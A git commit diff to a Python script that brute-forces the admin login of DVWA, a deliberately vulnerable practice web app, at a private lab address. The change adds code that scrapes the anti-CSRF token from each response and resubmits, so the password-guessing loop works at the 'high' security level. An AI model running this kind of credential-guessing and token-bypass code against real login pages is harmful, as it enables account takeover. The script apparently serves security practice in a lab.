4021d6e7a2f6726cd8d75ff2b926c10a02fe3853
gleaming0 <aheun1216@naver.com>
2023-01-02 09:23:08 +0900

    move files

--- dvwa/script/BruteForce.py
+++ dvwa/script/BruteForce.py
@@ -6,18 +6,31 @@ def webAttack():
    url = 'http://192.168.56.103/dvwa/vulnerabilities/brute/'
    flag = False
 
+   security = "high"
+   PHPSESSID = "5bfa88dac2a9896a0e80d9dac37cbceb"
+
    with open(dic, 'r') as f:
       for passwd in f.readlines():
          passwd = passwd.strip()
 
          # PHPSESSID 알맞게 수정
-         cookie = {"security":"low", "PHPSESSID":"5bfa88dac2a9896a0e80d9dac37cbceb"}
+         cookie = {"security":security, "PHPSESSID":PHPSESSID}
          data = {
             "username" : "admin",
             "password" : passwd,
             "Login" : "Login"
          }
+
+
          r = requests.get(url, params=data, cookies=cookie)
+         # print(r.text)
+
+         if r.text.find("CSRF token is incorrect") > -1:
+            tmp = r.text.split("'user_token'")
+            user_token = (tmp[1].split("'"))[1]
+            data["user_token"] = user_token
+            print("[!] Try", data["username"], data["password"], data["user_token"])
+            r = requests.get(url, params=data, cookies=cookie)
 
          if r.text.find("Welcome") > -1:
             print("[+] Find password :", passwd)
